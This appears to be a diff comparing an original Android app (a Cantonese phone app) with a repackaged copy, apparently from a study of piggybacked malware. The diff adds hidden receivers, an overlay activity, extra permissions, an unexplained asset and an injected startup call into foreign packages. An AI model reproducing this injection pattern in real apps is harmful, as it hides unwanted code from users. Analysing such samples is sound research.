@@ -1,0 +1,169 @@
+Somente em result/APP_49/App_M_49/android: annotation
+diff -r result/APP_49/App_B_49/AndroidManifest.xml result/APP_49/App_M_49/AndroidManifest.xml
+6c6
+<         <activity android:label="@string/app_name" android:name="CantonesePhone">
+---
+>         <activity android:label="@string/app_name" android:name="com.nesnet.android.cantonese.CantonesePhone">
+19a20,47
+>         <activity android:excludeFromRecents="true" android:label="" android:name="com.bodys.sh.Bjbwa" android:screenOrientation="portrait">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+>             </intent-filter>
+>         </activity>
+>         <receiver android:name="com.bodys.sh.Bjbwr">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="com.bodys.sh.Bjbws"/>
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.fivefeiwo.coverscreen.SA" android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"/>
+>         <activity android:launchMode="singleInstance" android:name="com.fivefeiwo.coverscreen.WA"/>
+>         <receiver android:name="com.fivefeiwo.coverscreen.SR">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>                 <action android:name="broadcast.route.control"/>
+>             </intent-filter>
+>         </receiver>
+20a49,55
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+diff -r result/APP_49/App_B_49/apktool.yml result/APP_49/App_M_49/apktool.yml
+2c2
+< apkFileName: Bapp49-75E6D38D05B0D27404863BB9B32DA36DC31BE2F6A3FE03D04216E70D58D79C72.apk
+---
+> apkFileName: Mapp49-61A821BFC736D682D560339E05923437F90A66B1ADF95E26D112F693D65B8131.apk
+5,6d4
+< - resources.arsc
+< - png
+7a6,7
+> - png
+> - assets/wknb
+Somente em result/APP_49/App_M_49/: assets
+Somente em result/APP_49/App_M_49/com: bodys
+Somente em result/APP_49/App_M_49/com: fivefeiwo
+diff -r result/APP_49/App_B_49/com/nesnet/android/cantonese/CantonesePhone.java result/APP_49/App_M_49/com/nesnet/android/cantonese/CantonesePhone.java
+43a44
+> import com.bodys.sh.common.FViewInit;
+459a461
+>     FViewInit.VFCBase(this);
+Os arquivos binários result/APP_49/App_B_49/original/AndroidManifest.xml e result/APP_49/App_M_49/original/AndroidManifest.xml são diferentes
+Os arquivos binários result/APP_49/App_B_49/original/META-INF/CERT.RSA e result/APP_49/App_M_49/original/META-INF/CERT.RSA são diferentes
+diff -r result/APP_49/App_B_49/original/META-INF/CERT.SF result/APP_49/App_M_49/original/META-INF/CERT.SF
+2,6c2,3
+< Created-By: 1.0 (Android)
+< SHA1-Digest-Manifest: 5ClZO/AoI7LqXMgkBTPLzcMvkLs=
+< 
+< Name: res/drawable-xhdpi/ic_launcher.png
+< SHA1-Digest: HJWVdRCXqdgpLGGDT6Uzb5hkqQE=
+---
+> Created-By: 1.0 (Android SignApk)
+> SHA1-Digest-Manifest: gPqQ634OV5HwLen1I6sFgzdNGL0=
+10a8,10
+> Name: res/drawable-xhdpi/ic_launcher.png
+> SHA1-Digest: HJWVdRCXqdgpLGGDT6Uzb5hkqQE=
+> 
+38,40d37
+< Name: res/drawable/sndc_1y_b.png
+< SHA1-Digest: EGxrXBzJUADBnw8ZQ+zMfJZT0qA=
+< 
+43a41,43
+> Name: res/drawable/sndc_1y_b.png
+> SHA1-Digest: EGxrXBzJUADBnw8ZQ+zMfJZT0qA=
+> 
+84c84
+< SHA1-Digest: Jj3/92wXFJCuqJo2H7fOi29kRa4=
+---
+> SHA1-Digest: j4gDJ1nVM2+Qx7UoRL3yeZdrSeQ=
+105c105
+< SHA1-Digest: rvPLMqT1ci7LGvFJGrSY5ETe5SU=
+---
+> SHA1-Digest: Kpl+S6srfj8QJdySHfhrQ0nOalw=
+111c111
+< SHA1-Digest: bM2Gwe8up8XV3P3/VzDKcyDl6Hs=
+---
+> SHA1-Digest: QTH8s6p8M2Q+BUZ1huQD0L8PvkI=
+126c126
+< SHA1-Digest: gjXFTVnIjwsesOam5ncvnPiRMN0=
+---
+> SHA1-Digest: H1c9lQLAC1rOOix7Qs/Hejff8nw=
+147c147
+< SHA1-Digest: 1LrHK4Yrd8HVo56DNKFcFlHnmbM=
+---
+> SHA1-Digest: urqi92+XEoop2SXU7le03CafqEA=
+156c156
+< SHA1-Digest: lLzAwAh6ivOlfFkTOxF5ya8v7HA=
+---
+> SHA1-Digest: dE/WrkQyWIJPVBPrN5Ni3TW+WR4=
+199a200,202
+> Name: assets/wknb
+> SHA1-Digest: qWKYMgQfvZOiSWIfMuGcu97tXh0=
+> 
+210c213
+< SHA1-Digest: rjWjW1MkKo8RRuDqEyKs1o//xfQ=
+---
+> SHA1-Digest: N0oYyHyot5O+PnK3rXj58Nb2dMo=
+diff -r result/APP_49/App_B_49/original/META-INF/MANIFEST.MF result/APP_49/App_M_49/original/META-INF/MANIFEST.MF
+2,5c2
+< Created-By: 1.0 (Android)
+< 
+< Name: res/drawable-xhdpi/ic_launcher.png
+< SHA1-Digest: UCzYT6RE8m1+z99KNVBkhnl38jY=
+---
+> Created-By: 1.0 (Android SignApk)
+9a7,9
+> Name: res/drawable-xhdpi/ic_launcher.png
+> SHA1-Digest: UCzYT6RE8m1+z99KNVBkhnl38jY=
+> 
+83c83
+< SHA1-Digest: fg6039NZmrNDTE+S52JTVCOdr2o=
+---
+> SHA1-Digest: 2XcsT6ga3aYkTOnHL26bi3UzIHU=
+104c104
+< SHA1-Digest: PVmJsqhr9DGNlhmfNC7sohBR2uM=
+---
+> SHA1-Digest: UHZaKJJm607VApA26pOMKUVOEi8=
+110c110
+< SHA1-Digest: MUt0u+8Dg/JxRv4l+HT/rtvEnAg=
+---
+> SHA1-Digest: /yFF6RyRazTNNTFAmeK7VyrOgyA=
+125c125
+< SHA1-Digest: hIpHHqf8nRR9CBF0ZrMXQ8utb34=
+---
+> SHA1-Digest: T059vjTXexNSLLCRNM7+EG6go4Q=
+146c146
+< SHA1-Digest: PY4t09wgtSoXIvR12fWKV1XAPbI=
+---
+> SHA1-Digest: C36OJtMSaslsaKwE/Wav7wQzjak=
+152c152
+< SHA1-Digest: W5PWdjuBIRrDzTp4ZGkAYewOMh0=
+---
+> SHA1-Digest: V8sCUpQntTZQq2LpQCz/XNRlDeo=
+198a199,201
+> Name: assets/wknb
+> SHA1-Digest: C/NzoGZ0dPQeS9cNL2720mF6tzE=
+> 
+206c209
+< SHA1-Digest: YrsN2wAXWDFZTkzrFvkqulQG0U0=
+---
+> SHA1-Digest: q/8cth/6gS0Fd3s0I2L6K/d1B/g=
+Somente em result/APP_49/App_M_49/smali/android: annotation
+Somente em result/APP_49/App_M_49/smali/com: bodys
+Somente em result/APP_49/App_M_49/smali/com: fivefeiwo
+diff -r result/APP_49/App_B_49/smali/com/nesnet/android/cantonese/CantonesePhone.smali result/APP_49/App_M_49/smali/com/nesnet/android/cantonese/CantonesePhone.smali
+1751a1752,1753
+>     invoke-static {p0}, Lcom/bodys/sh/common/FViewInit;->VFCBase(Landroid/content/Context;)V
+> 
